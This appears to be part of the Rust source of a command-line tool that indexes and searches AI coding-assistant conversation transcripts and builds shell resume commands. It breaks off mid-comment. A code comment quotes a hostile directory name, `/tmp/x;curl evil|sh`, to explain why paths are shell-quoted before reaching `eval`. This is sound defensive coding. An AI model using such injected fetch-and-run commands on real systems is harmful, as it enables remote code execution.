use clap::{Parser, Subcommand};

use crate::db;
use crate::error::{AppError, Result};
use crate::indexer::codex::CodexIndexer;
use crate::indexer::count_conversation_files_on_disk;
use crate::indexer::opencode::{get_opencode_db_path, OpenCodeIndexer};
use crate::indexer::ConversationIndexer;
use crate::search::{format_timestamp, ConversationSearch, SearchFilter, SortOrder, TreeNode};

/// Source display labels
const SOURCE_LABELS: &[(&str, &str)] = &[("opencode", "[OC]"), ("codex", "[CX]")];

const AUTO_INDEX_TTL_SECS: u64 = 300;
const FULL_INDEX_TTL_SECS: u64 = 86400;
const HOOK_INDEX_TTL_SECS: u64 = 0;
const STAMP_FILE_PATH: &str = "~/.conversation-search/.last-auto-index";
const FULL_STAMP_FILE_PATH: &str = "~/.conversation-search/.last-full-index";

fn source_label(source: &str) -> &str {
    SOURCE_LABELS
        .iter()
        .find(|(k, _)| *k == source)
        .map(|(_, v)| *v)
        .unwrap_or("[CC]")
}

/// The `claude` invocation to put in resume commands.
///
/// Deliberately interpolated unquoted: this is a shell fragment, not a filename, and a user
/// may legitimately set it to `env FOO=1 claude` or add flags. Note the trust boundary --
/// Claude Code lets a project's own `.claude/settings.json` set `env`, so unlike `PATH` this
/// value can come from the repository being searched, and it lands inside a string the docs
/// tell you to `eval`. Treat it as operator-owned configuration, not as data.
fn claude_cmd() -> String {
    std::env::var("CC_CONVERSATION_SEARCH_CMD").unwrap_or_else(|_| "claude".to_string())
}

/// Quote a string for safe interpolation into a POSIX shell command.
///
/// `resume_command` reaches a shell: the picker pipes it into `eval` (README.md documents
/// `eval "$(ai-conversation-search pick)"`, and `bin/ai-conversation-search` takes the
/// field verbatim), and REFERENCE.md documents the JSON field as eval-safe. `project_path`
/// is transcript-derived and unvalidated, so a directory named `/tmp/x;curl evil|sh` would
/// otherwise execute on resume; the benign form of the same bug is a plain space turning
/// `cd /My Projects/app` into a cd somewhere else entirely.
///
/// Conditional rather than unconditional so ordinary paths and UUIDs pass through byte for
/// byte, which keeps the documented examples and the picker's field parsing unchanged.
fn shell_quote(s: &str) -> String {
    fn is_safe(c: char) -> bool {
        c.is_ascii_alphanumeric()
            || matches!(c, '_' | '@' | '%' | '+' | '=' | ':' | ',' | '.' | '/' | '-')
    }
    if !s.is_empty() && s.chars().all(is_safe) {
        return s.to_string();
    }
    // Single quotes suppress every expansion; the one character they cannot contain is `'`
    // itself, spliced back in as `'\''` -- close, escaped quote, reopen.
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Whether a value can be safely interpolated into a resume command at all.
///
/// Rejects every control character, not just the three that motivate it, because quoting
/// cannot save any of them and there is no value in a path that contains one:
///
/// - NUL terminates the string for the consuming shell mid-quote, leaving the quote open
///   and splicing whatever follows into the command.
/// - Newline, carriage return and tab survive quoting but break the picker's
///   tab-separated, one-row-per-line protocol (`bin/ai-conversation-search` splits fields
///   with `cut`), so a fragment of the command would reach `eval` on its own.
/// - ESC and friends would be rendered straight into a terminal by the picker.
fn is_shell_safe_value(s: &str) -> bool {
    !s.chars().any(|c| c.is_control())
}

/// Envelope for the list-shaped `--json` commands: `search`, `search --group-by-session`,
/// and `list`.
///
/// stdout has to be able to say "there was more than this". A bare array cannot, and the
/// stderr truncation notice is invisible to a consumer reading only stdout -- which is how
/// "not found" gets confused with "not looked for".
///
/// No `count` field: it is `results | length`, and a number sitting next to `truncated`
/// reads as the total match count rather than the returned one.
#[derive(serde::Serialize)]
struct JsonEnvelope {
    results: serde_json::Value,
    truncated: bool,
}

/// The `message_uuid` of a result row.
///
/// Top level for both shapes: `GroupedRow` carries its representative with
/// `#[serde(flatten)]`, so `--group-by-session` rows put the message's own fields at the
/// same level as `match_count`.
fn row_message_uuid(item: &serde_json::Value) -> Option<String> {
    item.get("message_uuid")
        .and_then(|v| v.as_str())
        .map(String::from)
}

/// Attach message bodies to result rows when `--content` was asked for.
///
/// One indexed point lookup per row, so it is only paid for on request. The body is
/// truncated to the same `--content-chars` the human output uses: REFERENCE.md puts the
/// average user message at 3.5K characters, so an uncapped `--limit 50 --content --json` is
/// ~175KB flowing into an agent's context through a skill that says "always use --json".
fn inject_full_content(
    val: &mut serde_json::Value,
    search: &ConversationSearch,
    content_chars: usize,
) {
    let serde_json::Value::Array(arr) = val else {
        return;
    };
    for item in arr.iter_mut() {
        let Some(uuid) = row_message_uuid(item) else {
            continue;
        };
        let Some(body) = search.get_full_message_content(&uuid) else {
            continue;
        };
        let (text, dropped) = truncate_chars(&body, content_chars);
        if let Some(map) = item.as_object_mut() {
            map.insert("full_content".to_string(), serde_json::Value::String(text));
            map.insert(
                "full_content_truncated".to_string(),
                serde_json::Value::Bool(dropped),
            );
        }
    }
}

/// Serialize rows into the envelope, inject `resume_command`, and print.
///
/// Both injections run on the inner array *before* wrapping. `inject_resume_command`
/// recurses into arrays and mutates session-bearing objects but does not descend into
/// object values, so running it on the finished envelope would silently do nothing.
fn print_json_envelope<T: serde::Serialize>(
    rows: &T,
    truncated: bool,
    content: Option<(&ConversationSearch, usize)>,
) -> Result<()> {
    let mut results = localize_timestamps(serde_json::to_value(rows)?);
    inject_resume_command(&mut results);
    if let Some((search, content_chars)) = content {
        inject_full_content(&mut results, search, content_chars);
    }
    let envelope = JsonEnvelope { results, truncated };
    println!("{}", serde_json::to_string_pretty(&envelope)?);
    Ok(())
}

/// Recursively convert UTC ISO timestamps to local timezone in JSON values.
fn localize_timestamps(val: serde_json::Value) -> serde_json::Value {
    use chrono::DateTime;

    match val {
        serde_json::Value::Array(arr) => {
            serde_json::Value::Array(arr.into_iter().map(localize_timestamps).collect())
        }
        serde_json::Value::Object(map) => {
            let timestamp_keys = [
                "timestamp",
                "first_message_at",
                "last_message_at",
                "indexed_at",
            ];
            let new_map: serde_json::Map<String, serde_json::Value> = map
                .into_iter()
                .map(|(k, v)| {
                    if timestamp_keys.contains(&k.as_str()) {
                        if let Some(s) = v.as_str() {
                            if s.ends_with('Z') {
                                let cleaned = s.replace('Z', "+00:00");
                                if let Ok(dt) = DateTime::parse_from_rfc3339(&cleaned) {
                                    let local: DateTime<chrono::Local> =
                                        dt.with_timezone(&chrono::Local);
                                    return (k, serde_json::Value::String(local.to_rfc3339()));
                                }
                            }
                        }
                        (k, v)
                    } else {
                        let localized = match v {
                            serde_json::Value::Object(_) | serde_json::Value::Array(_) => {
                                localize_timestamps(v)
                            }
                            other => other,
                        };
                        (k, localized)
                    }
                })
                .collect();
            serde_json::Value::Object(new_map)
        }
        other => other,
    }
}

#[derive(Parser)]
#[command(
    name = "ai-conversation-search",
    about = "Find and resume Claude Code conversations using semantic search"
)]
#[command(version)]
pub struct Cli {
    #[command(subcommand)]
    pub command: Option<Commands>,
}

#[derive(Subcommand)]
pub enum Commands {
    /// Initialize database and index
    Init {
        /// Days of history to index (default: 7)
        #[arg(long, default_value_t = 7)]
        days: i64,
        /// Reinitialize existing database
        #[arg(long)]
        force: bool,
        /// Minimal output
        #[arg(long)]
        quiet: bool,
    },
    /// Index conversations
    Index {
        /// Days back to index (default: 1)
        #[arg(long, default_value_t = 1)]
        days: i64,
        /// Index all conversations
        #[arg(long)]
        all: bool,
        /// Re-read Claude Code transcripts even if unchanged since the last index
        #[arg(long)]
        force: bool,
        /// Minimal output
        #[arg(long)]
        quiet: bool,
    },
    /// Remove already-indexed claude-mem observer sessions
    PruneObserver {
        /// Report what would be removed without changing the database
        #[arg(long)]
        dry_run: bool,
        /// Skip the confirmation prompt (required when stdin is not a terminal)
        #[arg(long)]
        yes: bool,
    },
    /// Show index status and health
    Status {
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Search conversations
    Search {
        /// Search query
        query: String,
        /// Exact phrase match (wraps query in quotes for FTS5)
        #[arg(long)]
        exact: bool,
        /// Limit to last N days
        #[arg(long)]
        days: Option<i64>,
        /// Start date (YYYY-MM-DD, yesterday, today)
        #[arg(long)]
        since: Option<String>,
        /// End date (YYYY-MM-DD, yesterday, today)
        #[arg(long)]
        until: Option<String>,
        /// Specific date (YYYY-MM-DD, yesterday, today)
        #[arg(long)]
        date: Option<String>,
        /// Filter by project path
        #[arg(long)]
        project: Option<String>,
        /// Filter by repository root (partial match)
        #[arg(long)]
        repo: Option<String>,
        /// Filter by source
        #[arg(long, value_parser = ["claude_code", "opencode", "codex"])]
        source: Option<String>,
        /// Max results (default: 20)
        #[arg(long, default_value_t = 20)]
        limit: i64,
        /// Show message bodies instead of snippets
        #[arg(long)]
        content: bool,
        /// Max characters of body to show with --content (default: 300)
        #[arg(long, default_value_t = 300, requires = "content")]
        content_chars: usize,
        /// Show search diagnostics (session/message counts)
        #[arg(long, short = 'v')]
        verbose: bool,
        /// Group results by session (show the top-ranked match per session)
        #[arg(long)]
        group_by_session: bool,
        /// Result order: relevance (bm25) or recent (newest first)
        #[arg(long, value_parser = ["relevance", "recent"], default_value = "relevance")]
        sort: String,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Get context around a message
    Context {
        /// Message UUID
        uuid: String,
        /// Parent depth (default: 3)
        #[arg(long, default_value_t = 3)]
        depth: i32,
        /// Show full content
        #[arg(long)]
        content: bool,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// List recent conversations
    List {
        /// Days back (default: 7)
        #[arg(long)]
        days: Option<i64>,
        /// Start date
        #[arg(long)]
        since: Option<String>,
        /// End date
        #[arg(long)]
        until: Option<String>,
        /// Specific date
        #[arg(long)]
        date: Option<String>,
        /// Max results (default: 20)
        #[arg(long, default_value_t = 20)]
        limit: i64,
        /// Filter by repository root
        #[arg(long)]
        repo: Option<String>,
        /// Filter by source
        #[arg(long, value_parser = ["claude_code", "opencode", "codex"])]
        source: Option<String>,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Show conversation tree
    Tree {
        /// Session ID
        session_id: String,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Get session resumption commands
    Resume {
        /// Message UUID
        uuid: String,
    },
    /// Trigger background indexing (for use as a Claude Code hook)
    Hook,
}

fn index_other_sources(days_back: Option<i64>, quiet: bool) {
    let oc_path = db::expand_path(&get_opencode_db_path());
    if oc_path.exists() {
        if !quiet {
            eprintln!("\nIndexing OpenCode conversations...");
        }
        let oc = OpenCodeIndexer::new(None, None, quiet);
        if let Err(e) = oc.scan_and_index(days_back) {
            eprintln!("Warning: failed to index OpenCode conversations: {}", e);
        }
    }

    let codex_dir = db::expand_path("~/.codex/sessions");
    if codex_dir.exists() {
        if !quiet {
            eprintln!("\nIndexing Codex CLI conversations...");
        }
        let cx = CodexIndexer::new(None, None, quiet);
        if let Err(e) = cx.scan_and_index(days_back) {
            eprintln!("Warning: failed to index Codex CLI conversations: {}", e);
        }
    }
}

fn touch_stamp_file() {
    touch_stamp_at(&db::expand_path(STAMP_FILE_PATH));
}

fn touch_stamp_at(stamp_path: &std::path::Path) {
    if let Some(parent) = stamp_path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::write(stamp_path, "");
}

/// Returns true if the stamp file is stale (older than TTL or missing).
fn is_stamp_stale(stamp_path: &std::path::Path, ttl_secs: u64) -> bool {
    match std::fs::metadata(stamp_path) {
        Ok(meta) => match meta.modified() {
            Ok(mtime) => {
                mtime.elapsed().unwrap_or_default() >= std::time::Duration::from_secs(ttl_secs)
            }
            Err(_) => true,
        },
        Err(_) => true,
    }
}

/// Spawn a background index process if the stamp file is stale.
/// All errors are silently ignored — this must never block or fail the caller.
fn maybe_background_index() {
    let _ = try_background_index(None);
}

/// TTL for the Stop-hook trigger, defaulting to 0 (always index).
///
/// Takes the raw value rather than reading the environment so it stays assertable without
/// mutating process-wide state, which parallel tests share.
fn hook_index_ttl_secs(raw: Option<String>) -> u64 {
    raw.and_then(|v| v.parse::<u64>().ok())
        .unwrap_or(HOOK_INDEX_TTL_SECS)
}

fn try_background_index(incremental_ttl_override: Option<u64>) -> Option<()> {
    let stamp_path = db::expand_path(STAMP_FILE_PATH);
    let full_stamp_path = db::expand_path(FULL_STAMP_FILE_PATH);

    let ttl_secs = incremental_ttl_override.unwrap_or_else(|| {
        std::env::var("CONVERSATION_SEARCH_INDEX_TTL")
            .ok()
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(AUTO_INDEX_TTL_SECS)
    });

    let full_ttl_secs = std::env::var("CONVERSATION_SEARCH_FULL_INDEX_TTL")
        .ok()
        .and_then(|v| v.parse::<u64>().ok())
        .unwrap_or(FULL_INDEX_TTL_SECS);

    let needs_full = is_stamp_stale(&full_stamp_path, full_ttl_secs);
    let needs_incremental = is_stamp_stale(&stamp_path, ttl_secs);

    if !needs_full && !needs_incremental {
        return Some(());
    }

    // Touch stamps before spawning to reduce (not eliminate) concurrent spawns.
    // TOCTOU race is possible but benign: SQLite WAL handles concurrent index writes safely.
    touch_stamp_at(&stamp_path);
    if needs_full {
        touch_stamp_at(&full_stamp_path);
    }

    let exe = std::env::current_exe().ok()?;
    let mut cmd = std::process::Command::new(exe);
    if needs_full {
        cmd.args(["index", "--all", "--quiet"]);
    } else {
        cmd.args(["index", "--days", "1", "--quiet"]);
    }
    cmd.stdout(std::process::Stdio::null());
    cmd.stderr(std::process::Stdio::null());
    cmd.stdin(std::process::Stdio::null());

    let _ = cmd.spawn();
    Some(())
}

/// Normalise `session_id` into the stem a Claude Code transcript would carry, or `None`
/// when it cannot name one.
///
/// Split out from `index_single_session` so the rejection rules are directly assertable:
/// inside that function every rejected input merely produces `false`, which a broken guard
/// would also produce, making the guard untestable through the return value alone.
///
/// Lowercased because SQLite `LIKE` resolves ids case-insensitively while the filenames on
/// disk are lowercase -- an uppercase id would resolve in the DB but never match here.
fn transcript_lookup_key(session_id: &str) -> Option<String> {
    let id = session_id.to_ascii_lowercase();
    // Guards the directory sweep, which is far too expensive to run on arbitrary input.
    // This also covers OpenCode (`oc:`) and Codex (`codex:`) ids, which carry a source
    // prefix and do not live in the ~/.claude*/projects/<project>/<uuid>.jsonl layout at
    // all: their `:` is neither a hex digit nor a dash, so they never reach the sweep.
    if id.len() < 8 || !id.chars().all(|c| c.is_ascii_hexdigit() || c == '-') {
        return None;
    }
    Some(id)
}

/// Index just the transcript for `session_id`, synchronously, into `db_path`.
///
/// Why not reuse `maybe_background_index`: that path spawns a detached process and is
/// TTL-debounced, so it can never satisfy a lookup happening in this same process -- which
/// is exactly the "session that ended a minute ago" case this exists for.
///
/// The bool means "one file was handed to the indexer without error", NOT "rows were
/// added": `index_conversation` also returns `Ok(())` for observer, summarizer and empty
/// transcripts. The caller only uses it to decide whether one extra query is worth issuing.
fn index_single_session(
    db_path: &str,
    session_id: &str,
    project_roots: Option<&[std::path::PathBuf]>,
) -> bool {
    let Some(id) = transcript_lookup_key(session_id) else {
        return false;
    };
    // Never create or migrate a database from a read path: ConversationIndexer::new opens
    // read-write and runs init_schema, so on a missing DB `tree` would silently build one.
    if !db::expand_path(db_path).exists() {
        return false;
    }

    let mut indexer = match ConversationIndexer::new(db_path, true) {
        Ok(indexer) => indexer,
        Err(e) => {
            log::warn!("targeted index could not open {}: {}", db_path, e);
            return false;
        }
    };
    // A stale claude_code_sync_state row would otherwise short-circuit the re-read and
    // leave this a silent no-op. One file is sub-second, so re-reading is affordable.
    indexer.set_force(true);

    // Reuse the real scanner rather than walking directories here: it already knows the
    // transcripts sit two levels below the discovered roots, and it carries the observer,
    // summarizer and agent-* skips. No date cutoff -- a session old enough to have missed
    // the window is precisely one that was never indexed.
    // `project_roots` exists so a test can point this at a temp tree instead of $HOME.
    // Discovery reads the home directory, which a test cannot supply without mutating
    // process-wide state -- the same reason `scan_project_dirs` is a separate function.
    let discovered;
    let roots = match project_roots {
        Some(roots) => roots,
        None => {
            discovered = indexer.discover_project_dirs();
            &discovered
        }
    };
    let files = indexer.scan_project_dirs(roots, None);
    let Some(path) = crate::indexer::claude_code::find_session_transcript(&files, &id) else {
        return false;
    };

    if let Err(e) = indexer.index_conversation(&path) {
        log::warn!("targeted index of {} failed: {}", path.display(), e);
        return false;
    }
    true
}

pub fn run(cli: Cli) -> Result<()> {
    // Before anything spawns the detached indexer, whose stderr goes to /dev/null. The
    // indexer is the process that reads this variable, so a warning raised there is
    // invisible to the person who set it -- which is the whole failure being warned about.
    crate::indexer::warn_on_unrecognised_observer_flag();

    match cli.command {
        None => {
            // Print help
            use clap::CommandFactory;
            Cli::command().print_help().ok();
            std::process::exit(1);
        }
        Some(Commands::Init { days, force, quiet }) => cmd_init(days, force, quiet),
        Some(Commands::Index {
            days,
            all,
            force,
            quiet,
        }) => cmd_index(days, all, force, quiet),
        Some(Commands::PruneObserver { dry_run, yes }) => cmd_prune_observer(dry_run, yes),
        Some(Commands::Status { json }) => cmd_status(json),
        Some(Commands::Search {
            query,
            exact,
            days,
            since,
            until,
            date,
            project,
            repo,
            source,
            limit,
            content,
            content_chars,
            verbose,
            group_by_session,
            sort,
            json,
        }) => {
            let effective_query = if exact {
                // Sanitize quotes to prevent FTS5 operator injection
                format!("\"{}\"", query.replace('"', ""))
            } else {
                query
            };
            let filter = SearchFilter {
                days_back: days,
                since: since.as_deref(),
                until: until.as_deref(),
                date: date.as_deref(),
                limit,
                project_path: project.as_deref(),
                repo: repo.as_deref(),
                source: source.as_deref(),
                // clap's value_parser restricts this to the two known values.
                sort: match sort.as_str() {
                    "recent" => SortOrder::Recent,
                    _ => SortOrder::Relevance,
                },
            };
            cmd_search(
                &effective_query,
                &filter,
                content,
                content_chars,
                verbose,
                group_by_session,
                json,
            )
        }
        Some(Commands::Context {
            uuid,
            depth,
            content,
            json,
        }) => cmd_context(&uuid, depth, content, json),
        Some(Commands::List {
            days,
            since,
            until,
            date,
            limit,
            repo,
            source,
            json,
        }) => {
            let filter = SearchFilter {
                days_back: days,
                since: since.as_deref(),
                until: until.as_deref(),
                date: date.as_deref(),
                limit,
                project_path: None,
                repo: repo.as_deref(),
                source: source.as_deref(),
                // `list` has no query, so there is no relevance to rank by.
                sort: SortOrder::Recent,
            };
            cmd_list(&filter, json)
        }
        Some(Commands::Tree { session_id, json }) => cmd_tree(&session_id, json),
        Some(Commands::Resume { uuid }) => cmd_resume(&uuid),
        Some(Commands::Hook) => cmd_hook(),
    }
}

fn cmd_init(days: i64, force: bool, quiet: bool) -> Result<()> {
    if !quiet {
        eprintln!("Conversation Search - Initializing");
        eprintln!("{}", "=".repeat(50));
    }

    let db_path = db::default_db_path();

    if db_path.exists() && !force {
        if !quiet {
            eprintln!("\u{2713} Database already exists: {}", db_path.display());
            eprintln!("  Use --force to reinitialize");
        }
        return Ok(());
    }

    if !quiet {
        eprintln!("Creating database: {}", db_path.display());
    }

    let mut indexer = ConversationIndexer::new(db::DEFAULT_DB_PATH, quiet)?;

    if !quiet {
        eprintln!("\nIndexing conversations from last {} days...", days);
    }

    let files = indexer.scan_conversations(Some(days));

    if files.is_empty() {
        if !quiet {
            eprintln!("  No conversations found");
        }
    } else {
        if !quiet {
            eprintln!("  Found {} conversation files", files.len());
        }
        let total = files.len();
        for (i, conv_file) in files.into_iter().enumerate() {
            if !quiet {
                eprint!(
                    "  [{}/{}] {}\r",
                    i + 1,
                    total,
                    conv_file
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_default()
                );
            }
            if let Err(e) = indexer.index_conversation(&conv_file) {
                eprintln!("\n  Error indexing {}: {}", conv_file.display(), e);
            }
        }
    }

    index_other_sources(Some(days), quiet);
    touch_stamp_file();
    touch_stamp_at(&db::expand_path(FULL_STAMP_FILE_PATH));

    if !quiet {
        eprintln!("\n\u{2713} Initialization complete!");
        eprintln!("  Database: {}", db_path.display());
        eprintln!("\nNext steps:");
        eprintln!("  \u{2022} Search conversations: ai-conversation-search search '<query>'");
        eprintln!("  \u{2022} List recent: ai-conversation-search list");
        eprintln!("  \u{2022} Re-index: ai-conversation-search index");
    }

    Ok(())
}

fn cmd_index(days: i64, all: bool, force: bool, quiet: bool) -> Result<()> {
    let mut indexer = ConversationIndexer::new(db::DEFAULT_DB_PATH, quiet)?;
    indexer.set_force(force);

    // Self-heal any conversations rows left orphaned by the pre-0.12.1 bug
    // (message_count > 0 but no messages in DB). Cheap LEFT JOIN; in steady
    // state returns 0 and stays silent. Err is logged even under --quiet so
    // a corrupted DB doesn't fail invisibly.
    match indexer.repair_orphan_conversations() {
        Ok(0) => {}
        Ok(n) => {
            if !quiet {
                eprintln!(
                    "Repaired {} orphan conversation row(s) — will re-index from JSONL",
                    n
                );
            }
        }
        Err(e) => {
            eprintln!("Warning: orphan repair failed: {}", e);
        }
    }

    let days_back = if all { None } else { Some(days) };
    let files = indexer.scan_conversations(days_back);

    if files.is_empty() {
        if !quiet {
            eprintln!("No Claude Code conversations to index");
        }
    } else {
        if !quiet {
            eprintln!("Indexing {} Claude Code conversations...", files.len());
        }
        let total = files.len();
        for (i, conv_file) in files.into_iter().enumerate() {
            if !quiet {
                eprint!(
                    "[{}/{}] {}\r",
                    i + 1,
                    total,
                    conv_file
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_default()
                );
            }
            if let Err(e) = indexer.index_conversation(&conv_file) {
                if !quiet {
                    eprintln!("\nError indexing {}: {}", conv_file.display(), e);
                }
            }
        }
        if !quiet {
            eprintln!("\u{2713} Indexed Claude Code conversations");
        }
    }

    let other_days = if all { Some(9999i64) } else { Some(days) };
    index_other_sources(other_days, quiet);
    touch_stamp_file();
    if all {
        touch_stamp_at(&db::expand_path(FULL_STAMP_FILE_PATH));
    }

    Ok(())
}

/// Decide whether an irreversible delete may proceed.
///
/// A non-TTY without `--yes` is refused rather than assumed. This command is reachable from
/// scripts and from agent shells, which never have a terminal, and "nobody answered" must
/// not read as "yes" for something that cannot be undone.
///
/// Only "y"/"yes" mean yes -- a prefix match would accept "yesterday", and treating an
/// empty line as consent would make a stray Enter destructive.
///
/// `is_terminal` and `reader` are parameters rather than reads of the real stdin so both
/// branches are reachable in tests. Probing `std::io::stdin()` directly made the outcome
/// depend on how `cargo test` was launched: green under CI, and a blocking `read_line` on a
/// developer's terminal.
fn confirm_prune(
    count: i64,
    assume_yes: bool,
    is_terminal: bool,
    reader: &mut impl std::io::BufRead,
) -> Result<bool> {
    use std::io::Write;

    if assume_yes {
        return Ok(true);
    }
    if !is_terminal {
        eprintln!(
            "Refusing to remove {} session(s) without confirmation.",
            count
        );
        eprintln!("stdin is not a terminal. Re-run with --yes, or --dry-run to preview.");
        return Err(AppError::General(
            "prune-observer requires --yes when stdin is not a terminal".to_string(),
        ));
    }

    eprint!(
        "Remove {} observer session(s)? This cannot be undone. [y/N] ",
        count
    );
    let _ = std::io::stderr().flush();
    let mut answer = String::new();
    reader.read_line(&mut answer)?;
    Ok(matches!(
        answer.trim().to_ascii_lowercase().as_str(),
        "y" | "yes"
    ))
}

/// Remove claude-mem observer sessions that earlier versions indexed.
///
/// Deliberately a command rather than a schema migration: migrations run inside the
/// detached indexer that `search` spawns, so a destructive one would fire silently on the
/// first search after upgrading, before anyone could take a backup.
fn cmd_prune_observer(dry_run: bool, assume_yes: bool) -> Result<()> {
    let mut indexer = ConversationIndexer::new(db::DEFAULT_DB_PATH, false)?;

    if dry_run {
        // One scan for both numbers; see survey_observer_sessions.
        let (count, sample) = indexer.survey_observer_sessions(20)?;
        eprintln!(
            "Would remove {} claude-mem observer session(s) and rebuild the full-text index.",
            count
        );
        for s in sample {
            eprintln!(
                "  {}  {}  {}",
                s.first_message_at, s.session_id, s.project_path
            );
        }
        eprintln!("Re-run without --dry-run to apply.");
        return Ok(());
    }

    // The destructive path still counts up front: the confirmation prompt and the
    // zero-session short-circuit both need the number before anything is deleted.
    let count = indexer.count_observer_sessions()?;

    if count == 0 {
        eprintln!("No claude-mem observer sessions in the index.");
        // Still rebuild. Databases created before 0.15.0 carry index entries stranded by
        // the old delete trigger whether or not claude-mem was ever used, and this is the
        // only command that clears them.
        eprintln!("Rebuilding the full-text index to clear entries stranded by the pre-0.15.0 delete trigger.");
        indexer.rebuild_fts()?;
        eprintln!("\u{2713} Full-text index rebuilt.");
        return Ok(());
    }

    eprintln!(
        "Removing {} claude-mem observer session(s) and rebuilding the full-text index.",
        count
    );
    eprintln!("This runs once and can take several minutes on a large index.");
    eprintln!("Back up ~/.conversation-search/index.db first — this cannot be undone.");
    eprintln!(
        "The observations themselves stay in claude-mem's own database; only this index changes."
    );

    let stdin = std::io::stdin();
    let is_terminal = std::io::IsTerminal::is_terminal(&stdin);
    if !confirm_prune(count, assume_yes, is_terminal, &mut stdin.lock())? {
        eprintln!("Aborted. Nothing was removed.");
        return Ok(());
    }

    let removed = match indexer.prune_observer_sessions() {
        Ok(n) => n,
        Err(e) => {
            eprintln!("Prune failed: {}", e);
            eprintln!("Nothing was removed — the whole operation runs in one transaction and rolled back.");
            eprintln!("If another ai-conversation-search process is indexing, wait for it to finish and re-run.");
            return Err(e);
        }
    };

    eprintln!("\u{2713} Removed {} observer session(s).", removed);
    // The file does not shrink -- freed pages are reused instead. Saying so up front
    // avoids a "nothing happened" reading of an unchanged file size.
    eprintln!("Database file size is unchanged; the freed space is reused by future indexing.");
    Ok(())
}

fn cmd_status(json_output: bool) -> Result<()> {
    let search = ConversationSearch::new(db::DEFAULT_DB_PATH)?;
    let files_on_disk = count_conversation_files_on_disk();
    let status = search.get_index_status(files_on_disk)?;

    if json_output {
        let json_val = serde_json::to_value(&status)?;
        let localized = localize_timestamps(json_val);
        println!("{}", serde_json::to_string_pretty(&localized)?);
        return Ok(());
    }

    println!("Index Status");
    println!("{}", "=".repeat(40));

    let db_path = db::expand_path(db::DEFAULT_DB_PATH);
    let size_mb = status.db_size_bytes as f64 / (1024.0 * 1024.0);
    println!("Database: {} ({:.1} MB)", db_path.display(), size_mb);
    println!(
        "FTS health: {}",
        if status.fts_healthy {
            "OK"
        } else {
            "CORRUPTED"
        }
    );

    println!("\nSessions: {} total", status.total_conversations);
    for sc in &status.by_source {
        println!("  {}: {}", sc.source, sc.count);
    }

    println!("\nMessages: {} total", status.total_messages);
    println!("Orphan conversation rows: {}", status.orphan_conversations);
    if status.orphan_conversations > 0 {
        eprintln!(
            "  \u{26a0} {} conversation row(s) have metadata but no indexed messages. Run 'ai-conversation-search index --all' to repair them.",
            status.orphan_conversations
        );
    }

    if let (Some(ref earliest), Some(ref latest)) =
        (&status.earliest_conversation, &status.latest_conversation)
    {
        let earliest_local = format_timestamp(earliest, true, false);
        let latest_local = format_timestamp(latest, true, false);
        println!("Coverage: {} ~ {}", earliest_local, latest_local);
    } else {
        println!("Coverage: (no data)");
    }

    if !status.by_repo.is_empty() {
        println!("\nTop repositories:");
        for rc in &status.by_repo {
            println!("  {} ({} sessions)", rc.repo_root, rc.count);
        }
    }

    println!(
        "\nIndexed files: {} / {} on disk",
        status.indexed_files, status.files_on_disk
    );
    let unindexed = status.files_on_disk as i64 - status.indexed_files;
    if unindexed > 0 {
        eprintln!("  \u{26a0} {} files not indexed. Run 'ai-conversation-search index --all' to include them.", unindexed);
    }

    Ok(())
}

/// Warn on stderr when `--limit` dropped matches.
///
/// Unconditional, not gated on --verbose: a caller who never sees this line reads a
/// capped list as the complete answer, which is how "not found" gets confused with
/// "not looked for". stderr keeps stdout's JSON contract intact.
fn print_truncation_notice(truncated: bool, shown: usize, unit: &str) {
    if truncated {
        // "may exist": the FTS path reports truncation when candidates were left
        // unscanned, and those can still all fail the filters.
        eprintln!(
            "Note: showing first {} {} (more matches may exist). Raise with --limit.",
            shown, unit
        );
    }
}

fn print_unindexed_warning(search: &ConversationSearch) {
    let files_on_disk = count_conversation_files_on_disk();
    match search.count_indexed_files() {
        Ok(indexed) => {
            let unindexed = files_on_disk as i64 - indexed;
            if unindexed > 0 {
                eprintln!("\u{26a0} {} conversation files not indexed. Run 'ai-conversation-search index --all' to include them.", unindexed);
            }
        }
        Err(e) => {
            eprintln!("Warning: could not check index status: {}", e);
        }
    }
}

/// Build the `cd … && claude --resume …` one-liner, or `None` if it cannot be made safe.
///
/// `cd --` terminates option parsing: a project directory named `-Users-foo` is all
/// "safe" characters, so it passes `shell_quote` through untouched, and quoting would not
/// help anyway -- `cd '-Users-foo'` is still `-Users-foo` after quote removal, which `cd`
/// reads as flags. `session_id` gets no such treatment because whether `claude --resume`
/// accepts a `--` separator is that CLI's business, not ours; a leading `-` there is
/// refused instead of guessed at. Real session ids are UUIDs, so this costs nothing.
fn build_resume_command(project_path: &str, session_id: &str, cmd: &str) -> Option<String> {
    if !is_shell_safe_value(project_path) || !is_shell_safe_value(session_id) {
        return None;
    }
    if session_id.starts_with('-') {
        return None;
    }
    Some(format!(
        "cd -- {} && {} --resume {}",
        shell_quote(project_path),
        cmd,
        shell_quote(session_id)
    ))
}

fn inject_resume_command(val: &mut serde_json::Value) {
    let cmd = claude_cmd();
    match val {
        serde_json::Value::Array(arr) => {
            for item in arr.iter_mut() {
                inject_resume_command(item);
            }
        }
        // Only inject into objects that have session_id (i.e., result rows)
        serde_json::Value::Object(map) if map.contains_key("session_id") => {
            let source = map
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("claude_code")
                .to_string();
            let session_id = map
                .get("session_id")
                .and_then(|v| v.as_str())
                .map(String::from);
            let project_path = map
                .get("project_path")
                .and_then(|v| v.as_str())
                .map(String::from);

            let resume = match (session_id, project_path) {
                (Some(sid), Some(pp)) => match source.as_str() {
                    "opencode" | "codex" => serde_json::Value::Null,
                    _ => build_resume_command(&pp, &sid, &cmd)
                        .map(serde_json::Value::String)
                        .unwrap_or(serde_json::Value::Null),
                },
                _ => serde_json::Value::Null,
            };
            map.insert("resume_command".to_string(), resume);
        }
        _ => {}
    }
}

/// Render a stored summary, or a placeholder when there is nothing to show.
///
/// Whitespace-only counts as nothing: it would otherwise print as a blank line, which
